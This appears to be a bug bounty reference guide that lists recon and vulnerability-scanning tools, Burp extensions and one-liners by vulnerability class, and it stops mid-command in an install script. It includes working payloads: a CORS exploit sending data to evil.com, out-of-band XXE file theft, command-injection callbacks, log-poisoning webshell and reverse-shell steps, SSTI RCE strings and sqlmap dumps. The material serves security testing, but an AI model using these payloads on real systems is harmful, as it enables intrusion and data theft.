# Bug Bounty Automation Tools & Burp Extensions
### Complete Reference for Every Vulnerability Class

> Curated for serious bug hunters. Every tool listed is actively maintained as of 2024–2025.  
> Install commands, usage one-liners, and what to chain with what.

---

## TABLE OF CONTENTS

1. [Subdomain & Asset Discovery](#1-subdomain--asset-discovery)
2. [HTTP Probing & Fingerprinting](#2-http-probing--fingerprinting)
3. [URL & Parameter Discovery](#3-url--parameter-discovery)
4. [XSS — Cross-Site Scripting](#4-xss---cross-site-scripting)
5. [SQL Injection](#5-sql-injection)
6. [SSRF — Server-Side Request Forgery](#6-ssrf---server-side-request-forgery)
7. [IDOR & Access Control](#7-idor--access-control)
8. [Open Redirect](#8-open-redirect)
9. [LFI / Path Traversal / RFI](#9-lfi--path-traversal--rfi)
10. [SSTI — Template Injection](#10-ssti---template-injection)
11. [Command Injection & RCE](#11-command-injection--rce)
12. [CORS Misconfiguration](#12-cors-misconfiguration)
13. [JWT & Authentication Bugs](#13-jwt--authentication-bugs)
14. [XXE — XML External Entity](#14-xxe---xml-external-entity)
15. [GraphQL Vulnerabilities](#15-graphql-vulnerabilities)
16. [CSRF](#16-csrf)
17. [Secrets & Sensitive Data Exposure](#17-secrets--sensitive-data-exposure)
18. [Cloud Misconfigurations (S3, GCS, Azure)](#18-cloud-misconfigurations)
19. [Subdomain Takeover](#19-subdomain-takeover)
20. [Nuclei — Universal Scanner](#20-nuclei---universal-scanner)
21. [Burp Suite Extensions — Full List](#21-burp-suite-extensions)
22. [Recon Automation Frameworks](#22-recon-automation-frameworks)
23. [Full Chain: One-Command Recon to Report](#23-full-chain-recon-to-report)

---

## 1. SUBDOMAIN & ASSET DISCOVERY

### Subfinder
```bash
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest

# Basic
subfinder -d target.com -silent

# All sources + recursive
subfinder -d target.com -all -recursive -silent -o subs.txt

# With API keys from config
subfinder -d target.com -all -pc ~/.config/subfinder/provider-config.yaml
```

### Amass
```bash
go install -v github.com/owasp-amass/amass/v4/...@master

# Passive OSINT
amass enum -passive -d target.com -o subs.txt

# Active with brute force
amass enum -active -d target.com -brute -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt

# Intel — WHOIS + ASN pivoting
amass intel -d target.com -whois
```

### crt.sh Query (Certificate Transparency)
```bash
# One-liner — no install needed
curl -s "https://crt.sh/?q=%25.target.com&output=json" | \
    jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u
```

### chaos (ProjectDiscovery)
```bash
go install -v github.com/projectdiscovery/chaos-client/cmd/chaos@latest

# Download all known subdomains for a program
chaos -d target.com -silent -o subs_chaos.txt
```

### dnsx — DNS resolution + brute
```bash
go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest

# Resolve subdomains
cat subs.txt | dnsx -silent -resp -o resolved.txt

# Brute force DNS
dnsx -d target.com -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -silent
```

### shuffledns
```bash
go install -v github.com/projectdiscovery/shuffledns/cmd/shuffledns@latest

# Mass DNS resolution with wildcard filtering
shuffledns -d target.com -w wordlist.txt -r resolvers.txt -o subs_resolved.txt
```

### **Chain: Subfinder → dnsx → httpx**
```bash
subfinder -d target.com -all -silent | \
    dnsx -silent | \
    httpx -silent -status-code -title > live_subs.txt
```

---

## 2. HTTP PROBING & FINGERPRINTING

### httpx
```bash
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest

# Full metadata probe
cat subs.txt | httpx -silent -status-code -title -tech-detect \
    -web-server -ip -cdn -favicon -follow-redirects

# Find admin panels
cat subs.txt | httpx -silent -mc 200,301,302,401,403 \
    -path /admin,/dashboard,/manager,/console
```

### whatweb — Technology detection
```bash
sudo apt install whatweb -y

whatweb -a 3 https://target.com
```

### wafw00f — WAF detection
```bash
pip3 install wafw00f --break-system-packages

wafw00f https://target.com
wafw00f -l   # list all detectable WAFs
```

### naabu — Fast port scanner
```bash
go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest

# Port scan + pipe to httpx
naabu -host target.com -top-ports 1000 -silent | httpx -silent
```

---

## 3. URL & PARAMETER DISCOVERY

### gau
```bash
go install github.com/lc/gau/v2/cmd/gau@latest

gau --subs target.com | tee urls.txt
```

### waybackurls (Tom Hudson)
```bash
go install github.com/tomnomnom/waybackurls@latest

waybackurls target.com | tee wayback.txt
```

### katana — Active crawler (ProjectDiscovery)
```bash
go install github.com/projectdiscovery/katana/cmd/katana@latest

# Passive + active + JS parsing
katana -u https://target.com -jc -d 5 -o katana_urls.txt

# With headless browser (finds SPA routes)
katana -u https://target.com -headless -jc -d 3
```

### arjun — Hidden parameter discovery
```bash
pip3 install arjun --break-system-packages

# Find hidden GET params on a URL
arjun -u https://target.com/api/user --get

# Bulk from file
arjun -i urls_with_params.txt -o arjun_params.json -t 10
```

### ParamSpider
```bash
git clone https://github.com/devanshbatham/ParamSpider /opt/ParamSpider
cd /opt/ParamSpider && pip3 install -r requirements.txt --break-system-packages

python3 paramspider.py -d target.com --level high -o params.txt
```

### x8 — Parameter discovery (Rust)
```bash
cargo install x8

x8 -u "https://target.com/page" -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt
```

### LinkFinder — JS endpoint extraction
```bash
git clone https://github.com/GerbenJavado/LinkFinder /opt/LinkFinder
pip3 install -r /opt/LinkFinder/requirements.txt --break-system-packages

# Single JS file
python3 /opt/LinkFinder/linkfinder.py -i https://target.com/app.js -o cli

# All JS from URL list
cat urls.txt | grep "\.js" | while read url; do
    python3 /opt/LinkFinder/linkfinder.py -i "$url" -o cli 2>/dev/null
done | sort -u > js_endpoints.txt
```

---

## 4. XSS — CROSS-SITE SCRIPTING

### dalfox — Best automated XSS scanner
```bash
go install github.com/hahwul/dalfox/v2@latest

# Single URL
dalfox url "https://target.com/search?q=test"

# From file (pipe-friendly)
cat urls_with_params.txt | dalfox pipe

# With custom headers (authenticated)
dalfox url "https://target.com/search?q=test" \
    -H "Cookie: session=abc123" \
    --follow-redirects

# Blind XSS with callback
dalfox url "https://target.com/?q=test" \
    --blind https://your-xsshunter.xss.ht

# With WAF bypass
dalfox url "https://target.com/?q=test" --waf-evasion

# Pipe from gau (full workflow)
gau target.com | grep "=" | dalfox pipe -o xss_results.txt
```

### XSStrike
```bash
git clone https://github.com/s0md3v/XSStrike /opt/XSStrike
pip3 install -r /opt/XSStrike/requirements.txt --break-system-packages

python3 /opt/XSStrike/xsstrike.py -u "https://target.com/search?q=test"
python3 /opt/XSStrike/xsstrike.py -u "https://target.com/search?q=test" --crawl
```

### kxss — Fast reflected XSS detection
```bash
go install github.com/tomnomnom/hacks/kxss@latest

# Check which params reflect input
cat urls_with_params.txt | kxss
```

### XSS Hunter (Blind XSS)
```
Sign up at: https://xsshunter.trufflesecurity.com/
Or self-host: https://github.com/mandatoryprogrammer/xsshunter-express

Payload: "><script src=//your-instance.xss.ht></script>
```

### **XSS Chain with WebRecon**
```bash
# From Phase 3 URL output → dalfox
cat results/target/03_urls/*with_params*.txt | dalfox pipe -o dalfox_xss.txt

# Or targeted with kxss first (faster)
cat results/target/03_urls/*with_params*.txt | kxss | \
    grep -oP "https?://[^ ]+" | dalfox pipe
```

---

## 5. SQL INJECTION

### sqlmap — The standard
```bash
# Single URL
sqlmap -u "https://target.com/item?id=1" --dbs --batch

# From file (all parameterized URLs)
sqlmap -m urls_with_params.txt --dbs --batch --level 3 --risk 2

# With cookie (authenticated)
sqlmap -u "https://target.com/api?id=1" \
    --cookie "session=abc123" --dbs --batch

# With Burp request file
sqlmap -r request.txt --dbs --batch

# Tamper scripts (WAF bypass)
sqlmap -u "https://target.com/?id=1" \
    --tamper=between,randomcase,space2comment --batch

# Time-based blind (when no error output)
sqlmap -u "https://target.com/?id=1" \
    --technique=T --dbs --batch

# Full dump
sqlmap -u "https://target.com/?id=1" -D dbname -T users --dump --batch
```

### ghauri — Modern sqlmap alternative
```bash
pip3 install ghauri --break-system-packages

ghauri -u "https://target.com/?id=1" --dbs --batch
```

### **SQLi Chain**
```bash
# Find injectable params with qsreplace (WebRecon Phase 4), then confirm with sqlmap
cat results/target/04_vulns/*SQLi*.txt | \
    grep -oP "URL=\K[^ ]+" | \
    while read url; do
        sqlmap -u "$url" --dbs --batch --level 2 --risk 1
    done
```

---

## 6. SSRF — SERVER-SIDE REQUEST FORGERY

### interactsh — OAST callback server (best)
```bash
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

# Start listener — gives you a unique URL
interactsh-client
# Copy the URL: abc123.oast.fun
```

### SSRFmap
```bash
git clone https://github.com/swisskyrepo/SSRFmap /opt/SSRFmap
pip3 install -r /opt/SSRFmap/requirements.txt --break-system-packages

python3 /opt/SSRFmap/ssrfmap.py -r request.txt -p url -m readfiles
```

### Gopherus — SSRF to RCE chaining
```bash
git clone https://github.com/tarunkant/Gopherus /opt/Gopherus

# Generate gopher:// payload for various backends
python2 /opt/Gopherus/gopherus.py --exploit redis
python2 /opt/Gopherus/gopherus.py --exploit mysql
```

### **SSRF Manual Testing Payloads**
```
Cloud metadata endpoints:
  http://169.254.169.254/latest/meta-data/          ← AWS
  http://metadata.google.internal/computeMetadata/v1/ ← GCP (needs: Metadata-Flavor: Google)
  http://169.254.169.254/metadata/instance?api-version=2019-06-04  ← Azure
  http://100.100.100.200/latest/meta-data/           ← Alibaba Cloud
  http://192.168.0.1/                                ← Internal router

Bypass filters:
  http://0177.0.0.1/  (octal)
  http://0x7f000001/  (hex)
  http://2130706433/  (decimal)
  http://[::1]/       (IPv6)
  http://spoofed.domain.com → resolves to 127.0.0.1
```

---

## 7. IDOR & ACCESS CONTROL

### ffuf — IDOR brute force
```bash
# Brute force numeric IDs
ffuf -w <(seq 1 1000) -u "https://target.com/api/user/FUZZ" \
    -H "Authorization: Bearer YOUR_TOKEN" \
    -mc 200 -t 50

# Compare responses between two accounts
# Tip: Use Burp's Autorize extension (see Section 21)
```

### autorize (Burp Extension — see §21)
Best tool for IDOR. Replay every request as a lower-privilege user automatically.

### idor-poc-generator
```bash
pip3 install idor-poc-generator --break-system-packages
```

### **IDOR Testing Strategy**
```
1. Create two accounts (user A = attacker, user B = victim)
2. Install Autorize in Burp, add user B's cookie
3. Browse as user A — Autorize auto-tests if B's cookie also works
4. Flag any 200 responses from B's session that shouldn't be accessible
5. Test: /api/user/{id}, /api/order/{id}, /api/document/{id}
6. Test GUIDs too — not just integers
```

---

## 8. OPEN REDIRECT

### oralyzer
```bash
git clone https://github.com/r0075h3ll/Oralyzer /opt/Oralyzer
pip3 install -r /opt/Oralyzer/requirements.txt --break-system-packages

python3 /opt/Oralyzer/oralyzer.py -l urls_with_params.txt -o open_redirects.txt
```

### **Open Redirect Chain (Fast)**
```bash
# Extract redirect-likely params from URL corpus
cat results/target/03_urls/*URL_MASTER*.txt | \
    grep -iE "[?&](redirect|url|next|return|goto|dest|destination|redir|r|u|target)=" | \
    qsreplace "https://evil.com" | \
    while read url; do
        loc=$(curl -sI -L --max-time 8 "$url" 2>/dev/null | grep -i "^location:" | tail -1)
        echo "$loc" | grep -qi "evil.com" && echo "[REDIRECT] $url -> $loc"
    done
```

---

## 9. LFI / PATH TRAVERSAL / RFI

### dotdotpwn
```bash
sudo apt install dotdotpwn -y

dotdotpwn -m http -h target.com -f /etc/passwd
```

### fimap
```bash
git clone https://github.com/kurobeats/fimap /opt/fimap

python /opt/fimap/fimap.py -u "https://target.com/page.php?file=about"
```

### LFI Suite
```bash
git clone https://github.com/D35m0nd142/LFISuite /opt/LFISuite
pip3 install -r /opt/LFISuite/requirements.txt --break-system-packages

python3 /opt/LFISuite/lfisuite.py
```

### **LFI Escalation Chain**
```
1. Find LFI: page.php?file=../../../../etc/passwd
2. Read logs: ?file=../../../../var/log/apache2/access.log
3. Poison logs: curl -A "<?php system(\$_GET['cmd']); ?>" https://target.com/
4. Execute: ?file=../../../../var/log/apache2/access.log&cmd=id
5. Upgrade: reverse shell via log poisoning
```

---

## 10. SSTI — TEMPLATE INJECTION

### tplmap
```bash
git clone https://github.com/epinna/tplmap /opt/tplmap
pip3 install -r /opt/tplmap/requirements.txt --break-system-packages

# Auto-detect engine + get RCE
python3 /opt/tplmap/tplmap.py -u "https://target.com/page?name=test"

# With POST data
python3 /opt/tplmap/tplmap.py -u "https://target.com/page" -d "name=test"

# OS shell
python3 /opt/tplmap/tplmap.py -u "https://target.com/page?name=test" --os-shell
```

### **SSTI Detection Payloads by Engine**
```
Jinja2 (Python):  {{7*7}}=49  |  {{config.items()}}  |  {{''.__class__.__mro__[1].__subclasses__()}}
Twig (PHP):       {{7*7}}=49  |  {{_self.env.registerUndefinedFilterCallback("exec")}}
Freemarker (Java): ${7*7}=49  |  <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
Velocity (Java):  #set($x=7*7)${x}=49
Pebble (Java):    {{7*7}}=49
ERB (Ruby):       <%= 7*7 %>=49
Smarty (PHP):     {php}echo id;{/php}
Handlebars (JS):  {{#with "s" as |string|}}...{{/with}}
```

---

## 11. COMMAND INJECTION & RCE

### commix — Automated command injection
```bash
go install github.com/commixproject/commix@latest
# OR
git clone https://github.com/commixproject/commix /opt/commix

python3 /opt/commix/commix.py -u "https://target.com/ping?host=127.0.0.1"
python3 /opt/commix/commix.py -r request.txt --all
python3 /opt/commix/commix.py -u "https://target.com/ping?host=127.0.0.1" --os-shell
```

### **CMDi Testing Payloads**
```bash
# Time-based blind
; sleep 5
| sleep 5
& sleep 5
`sleep 5`
$(sleep 5)

# Out-of-band (use interactsh URL)
; curl https://your.interactsh.com/$(id)
; nslookup $(whoami).your.interactsh.com

# Filter bypass
;s\l\e\e\p\t9
;${IFS}sleep${IFS}9
;`$IFS`sleep`$IFS`9
```

---

## 12. CORS MISCONFIGURATION

### corsy
```bash
git clone https://github.com/s0md3v/Corsy /opt/Corsy
pip3 install -r /opt/Corsy/requirements.txt --break-system-packages

# Single URL
python3 /opt/Corsy/corsy.py -u https://target.com

# From file
python3 /opt/Corsy/corsy.py -i live_hosts.txt -t 10
```

### CORStest
```bash
git clone https://github.com/RUB-NDS/CORStest /opt/CORStest

python3 /opt/CORStest/corstest.py target_list.txt
```

### **CORS Exploit Scenarios**
```javascript
// Test: does target reflect Origin?
// If Access-Control-Allow-Origin: https://evil.com → vulnerable!

// Exploit — steal data from victim
fetch('https://target.com/api/user', {credentials: 'include'})
  .then(r => r.text())
  .then(d => fetch('https://evil.com/steal?data=' + btoa(d)))
```

---

## 13. JWT & AUTHENTICATION BUGS

### jwt_tool
```bash
git clone https://github.com/ticarpi/jwt_tool /opt/jwt_tool
pip3 install -r /opt/jwt_tool/requirements.txt --break-system-packages

# Decode
python3 /opt/jwt_tool/jwt_tool.py <TOKEN>

# Tamper + resign (algorithm confusion)
python3 /opt/jwt_tool/jwt_tool.py <TOKEN> -T

# None algorithm attack
python3 /opt/jwt_tool/jwt_tool.py <TOKEN> -X a

# RS256 → HS256 confusion
python3 /opt/jwt_tool/jwt_tool.py <TOKEN> -X k -pk public_key.pem

# Brute force secret
python3 /opt/jwt_tool/jwt_tool.py <TOKEN> -C -d /opt/SecLists/Passwords/Common-Credentials/best1050.txt
```

### hashcat — JWT secret brute force
```bash
# HS256 JWT crack
hashcat -a 0 -m 16500 <JWT_TOKEN> /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

### **JWT Attack Checklist**
```
□ Algorithm = none → accept unsigned token?
□ HS256 with weak/guessable secret?
□ RS256 → HS256 confusion (use public key as HMAC secret)?
□ kid header injection (SQL / path traversal)?
□ jku/x5u header injection (host your own JWK)?
□ exp claim manipulation (set to far future)?
□ Modify sub/role/admin claims after confusion attack?
```

---

## 14. XXE — XML EXTERNAL ENTITY

### XXEinjector
```bash
git clone https://github.com/enjoiz/XXEinjector /opt/XXEinjector

ruby /opt/XXEinjector/XXEinjector.rb --host=your.server.com \
    --path=/etc/passwd --file=request.txt
```

### **XXE Payloads**
```xml
<!-- Basic file read -->
<?xml version="1.0"?>
<!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>

<!-- OOB (blind) - requires callback server -->
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % remote SYSTEM "http://your.server.com/evil.dtd">
  %remote;
]>
<data>&send;</data>

<!-- evil.dtd on your server -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY send SYSTEM 'http://your.server.com/?data=%file;'>">
%wrap;
```

---

## 15. GRAPHQL VULNERABILITIES

### graphw00f — GraphQL fingerprinting
```bash
pip3 install graphw00f --break-system-packages

graphw00f -f -d -t https://target.com/graphql
```

### graphql-cop — Automated GraphQL security testing
```bash
pip3 install graphql-cop --break-system-packages

graphql-cop -t https://target.com/graphql
```

### InQL — Burp Extension (see §21)
Best for interactive GraphQL testing in Burp.

### **GraphQL Attack Checklist**
```
□ Introspection enabled? → dump full schema
□ Batching attacks → send 1000 mutations in one request
□ Field suggestions enabled → leak field names
□ Mass assignment via mutations
□ IDOR via direct object references in queries
□ SQL/NoSQL injection in query variables
□ Nested query DoS (deep recursion)

Introspection query:
{__schema{types{name,fields{name,args{name,type{name,kind}}}}}}
```

---

## 16. CSRF

### XSRFProbe
```bash
pip3 install xsrfprobe --break-system-packages

csrfprobe -u https://target.com
```

### **CSRF Checklist**
```
□ Missing CSRF token on state-changing requests?
□ Token not tied to session (predictable/reusable)?
□ SameSite cookie attribute missing?
□ Referer/Origin header not validated?
□ CORS misconfiguration enabling cross-origin reads?

Quick test:
1. Capture state-changing POST request in Burp
2. Generate CSRF PoC (Burp: right-click → Engagement tools → Generate CSRF PoC)
3. Remove CSRF token → still works? → Vulnerable
```

---

## 17. SECRETS & SENSITIVE DATA EXPOSURE

### trufflehog — Secrets in git/URLs
```bash
go install github.com/trufflesecurity/trufflehog/v3@latest

# Scan a GitHub repo
trufflehog github --repo=https://github.com/target/repo

# Scan URLs (pipe from gau)
cat urls.txt | trufflehog filesystem --directory=-

# Scan a directory
trufflehog filesystem --directory=/path/to/clone
```

### gitleaks — Git secret scanner
```bash
go install github.com/gitleaks/gitleaks/v8@latest

gitleaks detect --source /path/to/repo -v
gitleaks detect --source /path/to/repo --report-format json -r leaks.json
```

### shhgit — Realtime GitHub secret monitor
```bash
go install github.com/eth0izzle/shhgit@latest
```

### **Secret Patterns to Look For in URLs**
```bash
# From your URL master file
cat results/target/03_urls/*URL_MASTER*.txt | grep -iE \
    'api[_-]?key|apikey|api[_-]?secret|access[_-]?token|auth[_-]?token|
     secret[_-]?key|private[_-]?key|oauth[_-]?token|bearer|password|passwd|
     aws[_-]?access|aws[_-]?secret|firebase|heroku|stripe|twilio|sendgrid|
     slack[_-]?token|github[_-]?token|gcp[_-]?key' | sort -u
```

### **S3/Cloud Secrets**
```
AWS key format:   AKIA[0-9A-Z]{16}
AWS secret:       [0-9a-zA-Z/+]{40}
GCP service acct: {..."type":"service_account"...}
Firebase:         AIza[0-9A-Za-z\-_]{35}
```

---

## 18. CLOUD MISCONFIGURATIONS

### S3Scanner
```bash
pip3 install s3scanner --break-system-packages

s3scanner scan --bucket target-bucket-name
s3scanner scan --bucket-file bucket_names.txt
```

### CloudBrute — Cloud asset brute force
```bash
go install github.com/0xsha/CloudBrute@latest

cloudbrute -d target.com -k target -m storage -t 80
```

### gcpbucketbrute
```bash
git clone https://github.com/RhinoSecurityLabs/GCPBucketBrute /opt/GCPBucketBrute
pip3 install -r /opt/GCPBucketBrute/requirements.txt --break-system-packages

python3 /opt/GCPBucketBrute/gcpbucketbrute.py -k target
```

### **Cloud Recon Checklist**
```
AWS S3:
  https://target.s3.amazonaws.com
  https://s3.amazonaws.com/target
  curl -s https://target.s3.amazonaws.com → look for <ListBucketResult>

GCS:
  https://storage.googleapis.com/target
  curl -s "https://storage.googleapis.com/storage/v1/b/target/o"

Azure Blob:
  https://target.blob.core.windows.net
  https://target.blob.core.windows.net/public?restype=container&comp=list

Firebase:
  https://target-default-rtdb.firebaseio.com/.json → open DB?
```

---

## 19. SUBDOMAIN TAKEOVER

### subjack
```bash
go install github.com/haccer/subjack@latest

subjack -w subs.txt -t 100 -timeout 30 -ssl -v -o takeover.txt
```

### nuclei takeover templates
```bash
nuclei -l subs.txt -t ~/nuclei-templates/http/takeovers/ -o takeovers.txt
```

### can-i-take-over-xyz
> Reference: https://github.com/EdOverflow/can-i-take-over-xyz  
> Check which services are vulnerable to takeover and exact fingerprints.

### **Takeover Fingerprints**
```
GitHub Pages:    "There isn't a GitHub Pages site here"
Heroku:          "No such app"
Shopify:         "Sorry, this shop is currently unavailable"
Fastly:          "Fastly error: unknown domain"
Cargo:           "Sorry, this site is no longer available"
AWS S3:          "NoSuchBucket" or "The specified bucket does not exist"
Azure:           "404 Web Site not found"
Zendesk:         "Help Center Closed"
```

---

## 20. NUCLEI — UNIVERSAL SCANNER

The single most powerful bug bounty automation tool. 3000+ templates covering every vulnerability class.

```bash
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# Update templates
nuclei -update-templates

# Scan live hosts (standard bug bounty)
nuclei -l live_hosts.txt -t ~/nuclei-templates/ \
    -severity medium,high,critical \
    -o nuclei_findings.txt

# Target specific categories
nuclei -u https://target.com -t ~/nuclei-templates/http/cves/
nuclei -u https://target.com -t ~/nuclei-templates/http/exposures/
nuclei -u https://target.com -t ~/nuclei-templates/http/takeovers/
nuclei -u https://target.com -t ~/nuclei-templates/http/misconfiguration/
nuclei -u https://target.com -t ~/nuclei-templates/http/vulnerabilities/
nuclei -u https://target.com -t ~/nuclei-templates/http/technologies/

# With custom headers
nuclei -l hosts.txt -H "Authorization: Bearer TOKEN" \
    -t ~/nuclei-templates/ -severity high,critical

# Rate-limited (WAF-aware)
nuclei -l hosts.txt -t ~/nuclei-templates/ -rl 10 -c 5

# DAST mode (with URL list)
nuclei -list urls.txt -dast \
    -t ~/nuclei-templates/dast/

# Pipe from httpx
cat subs.txt | httpx -silent | \
    nuclei -t ~/nuclei-templates/ -severity medium,high,critical
```

### Custom Nuclei Template Example
```yaml
id: custom-debug-page
info:
  name: Debug Page Exposed
  severity: medium
  tags: exposure,debug

requests:
  - method: GET
    path:
      - "{{BaseURL}}/debug"
      - "{{BaseURL}}/phpinfo.php"
      - "{{BaseURL}}/_debug_toolbar"
    matchers:
      - type: word
        words:
          - "PHP Version"
          - "Debug Toolbar"
          - "xdebug"
        part: body
```

---

## 21. BURP SUITE EXTENSIONS

Install all via **BApp Store** (Extender → BApp Store) or manual JAR load.

### 🔴 Essential — Install These First

| Extension | What it Does | BApp Store |
|---|---|---|
| **Autorize** | Auto-test IDOR/access control — replay every request as lower-priv user | ✅ |
| **Param Miner** | Find hidden parameters, headers, cache keys | ✅ |
| **Active Scan++** | Augments Burp's active scanner with extra checks | ✅ |
| **Backslash Powered Scanner** | Find injection points using differential analysis | ✅ |
| **Logger++** | Advanced request/response logging with filters | ✅ |
| **HTTP Request Smuggler** | Detect and exploit HTTP request smuggling | ✅ |
| **JWT Editor** | Full JWT attack toolkit (alg:none, key confusion, brute) | ✅ |
| **InQL** | GraphQL schema extraction + query generation | ✅ |

### 🟡 High Value

| Extension | What it Does | BApp Store |
|---|---|---|
| **CSRF Scanner** | Automated CSRF detection on every request | ✅ |
| **Retire.js** | Detect vulnerable JavaScript libraries | ✅ |
| **Software Version Reporter** | Flag outdated software versions | ✅ |
| **Reflected Parameters** | Highlight parameters that reflect in response | ✅ |
| **Taborator** | Collaborator-based SSRF/blind injection automation | ✅ |
| **Hackvertor** | Transform payloads (encode/decode/encrypt inline) | ✅ |
| **Copy As Python-Requests** | Export any request as Python code | ✅ |
| **CSRF PoC Generator** | Right-click → generate CSRF HTML PoC instantly | Built-in |
| **Upload Scanner** | Test file upload endpoints for webshells, XXE, etc. | ✅ |
| **403 Bypasser** | Auto-try 403 bypass techniques on forbidden responses | ✅ |

### 🟢 Specialist

| Extension | What it Does | BApp Store |
|---|---|---|
| **Turbo Intruder** | High-speed Intruder with Python scripting — race conditions | ✅ |
| **Race The Web** | Race condition testing | GitHub |
| **Error Message Checks** | Extract info from error messages | ✅ |
| **Collaborator Everywhere** | Inject Collaborator payloads into every request | ✅ |
| **CORS* | Detect CORS misconfigurations | ✅ |
| **J2EEScan** | Java EE / Spring specific checks | ✅ |
| **Detect Dynamic JS** | Find JS files that change between requests | ✅ |
| **GAP** | Extract hidden endpoints + parameters from JS | GitHub |
| **Flow** | Visual request flow / site map organizer | ✅ |
| **Stepper** | Multi-step request sequences (auth flows) | ✅ |

### Turbo Intruder Example (Race Condition)
```python
# Race condition on coupon redemption
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=30,
                          requestsPerConnection=1,
                          pipeline=False)
    for i in range(30):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

### Param Miner Usage
```
1. Right-click any request → Extensions → Param Miner → Guess params
2. Check Output tab for discovered params
3. "Guess headers" — finds cache poisoning vectors
4. "Guess cookies" — finds cookie-based state
```

### Autorize Usage
```
1. Install from BApp Store
2. Open Autorize tab
3. Add lower-privilege user's Cookie header
4. Browse as high-privilege user
5. Autorize auto-replays every request with low-priv cookie
6. Green = access denied (correct), Yellow/Red = IDOR found
```

---

## 22. RECON AUTOMATION FRAMEWORKS

### reconftw — Full automated recon
```bash
git clone https://github.com/six2dez/reconftw /opt/reconftw
cd /opt/reconftw && ./install.sh

# Full recon
./reconftw.sh -d target.com -a

# Just passive
./reconftw.sh -d target.com -p

# Just web vulns
./reconftw.sh -d target.com -w
```

### Axiom — Distributed recon (cloud)
```bash
# Spin up 10 cloud instances for parallel scanning
axiom-fleet recon 10
axiom-scan subs.txt -m httpx -o live.txt
```

### bounty-monitor — Program change tracking
```bash
git clone https://github.com/pdelteil/BugBountyHuntingEssentials /opt/bb

# Monitor for scope changes, new subdomains
```

### BBOT — Best modern recon framework
```bash
pip3 install bbot --break-system-packages

# Full recon
bbot -t target.com -f subdomain-enum web-thorough

# Passive only
bbot -t target.com -f subdomain-enum -rf passive

# Output formats
bbot -t target.com -f subdomain-enum -o bbot_results/ --output-modules json,csv
```

---

## 23. FULL CHAIN: RECON TO REPORT

### Complete One-Command Pipeline
```bash
TARGET="hackerone.com"

# 1. Subdomain enum → live hosts
subfinder -d $TARGET -all -silent | \
    httpx -silent -mc 200,301,302,401,403 \
    -status-code -title -tech-detect > live_hosts.txt

# 2. URL harvest
gau --subs $TARGET | tee urls_gau.txt
katana -list live_hosts.txt -jc -d 3 | tee urls_katana.txt
cat urls_gau.txt urls_katana.txt | sort -u | grep "=" > params.txt

# 3. XSS (dalfox)
cat params.txt | dalfox pipe -o xss_hits.txt &

# 4. SQLi (sqlmap bulk)
sqlmap -m params.txt --dbs --batch --level 2 &

# 5. SSRF (nuclei)
nuclei -l live_hosts.txt -t ~/nuclei-templates/http/vulnerabilities/ssrf/ &

# 6. Full nuclei scan
nuclei -l live_hosts.txt -t ~/nuclei-templates/ \
    -severity medium,high,critical -o nuclei.txt &

# 7. Subdomain takeover
subjack -w <(cut -d' ' -f1 live_hosts.txt) -t 100 -timeout 30 -o takeovers.txt &

# 8. Secret scan
cat urls_gau.txt | trufflehog filesystem --directory=- -o secrets.txt &

wait
echo "Done. Check xss_hits.txt, nuclei.txt, takeovers.txt, secrets.txt"
```

### Nuclei + WebRecon Integration
```bash
# After WebRecon Phase 2 completes:
LIVE="results/target.com_*/02_httpx/*LIVE_HOSTS_MASTER*.txt"

nuclei -l $LIVE \
    -t ~/nuclei-templates/ \
    -severity medium,high,critical \
    -H "User-Agent: Mozilla/5.0" \
    -o nuclei_from_webrecon.txt \
    -stats

# After Phase 3 (URL harvest):
PARAMS="results/target.com_*/03_urls/*URLs_with_params*.txt"
cat $PARAMS | dalfox pipe -o dalfox_from_webrecon.txt
```

### Bug Report Template (HackerOne/Bugcrowd)
```markdown
## Title
[Vuln Type] — [Affected Endpoint] — [Brief Impact]

## Severity
Critical / High / Medium / Low

## Summary
Brief description of the vulnerability in 2-3 sentences.

## Steps to Reproduce
1. Navigate to: https://target.com/endpoint?param=VALUE
2. [Step 2]
3. [Step 3]
4. Observe: [what happens]

## Impact
Describe business impact. Who is affected? What data/actions are exposed?

## Proof of Concept
[Screenshot / Video / curl command]

## Remediation Suggestion
[How to fix it]

## References
- OWASP: https://owasp.org/...
- CWE: https://cwe.mitre.org/...
```

---

## QUICK INSTALL ALL

```bash
#!/usr/bin/env bash
# Install every tool in this guide

# Go tools
GO_TOOLS=(
    "github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"
    "github.com/owasp-amass/amass/v4/...@master"
    "github.com/projectdiscovery/httpx/cmd/httpx@latest"
    "github.com/projectdiscovery/dnsx/cmd/dnsx@latest"
    "github.com/projectdiscovery/naabu/v2/cmd/naabu@latest"
    "github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
    "github.com/projectdiscovery/katana/cmd/katana@latest"
    "github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest"
    "github.com/lc/gau/v2/cmd/gau@latest"
    "github.com/tomnomnom/waybackurls@latest"
    "github.com/hahwul/dalfox/v2@latest"
    "github.com/tomnomnom/hacks/kxss@latest"
    "github.com/haccer/subjack@latest"
    "github.com/trufflesecurity/trufflehog/v3@latest"
    "github.com/gitleaks/gitleaks/v8@latest"
    "github.com/0xsha/CloudBrute@latest"
    "github.com/projectdiscovery/shuffledns/cmd/shuffledns@latest"
)

for tool in "${GO_TOOLS[@]}"; do
    echo "[*] Installing: $tool"
    go install -v "$tool" 2>/dev/null
done

# Python tools
pip3 install --break-system-packages \
    arjun ghauri wafw00f graphw00f graphql-cop \
